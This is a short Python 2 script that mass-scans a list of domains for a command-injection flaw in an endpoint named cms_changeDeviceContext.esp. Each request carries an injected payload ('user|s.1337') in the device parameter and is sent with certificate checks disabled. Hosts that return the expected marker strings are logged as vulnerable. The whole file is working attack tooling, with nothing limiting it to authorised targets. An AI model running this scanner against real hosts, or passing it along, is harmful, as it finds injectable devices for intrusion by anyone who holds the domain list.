import time
from requests import get, packages
packages.urllib3.disable_warnings()

def detect():
    f = open("output.txt", "w")
    nonreachableip = []
    domainlist = [line.rstrip() for line in open('inputfile.txt', 'r')]
    for i in domainlist:
        url = "https://"+i.strip()+"/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27;user|s.1337;"
        try:
            res = get(url, verify=False)
            print res.text
            if res.text == "@start@@end@" or res.text == "@start@Success@end@":
                print i.strip() + " is vulnerable"
                f.write(i.strip()+"\r\n")
            else:
                continue
        except:
            print("Connection refused by the Domain/IP "+ i)
            time.sleep(5)
            nonreachableip.append(i)
            print "recheck for the Domain/IP "+ i
            continue
    print "Not reachable Domains/IP are"
    for j in nonreachableip:
        print j
    print "test complete"


detect()
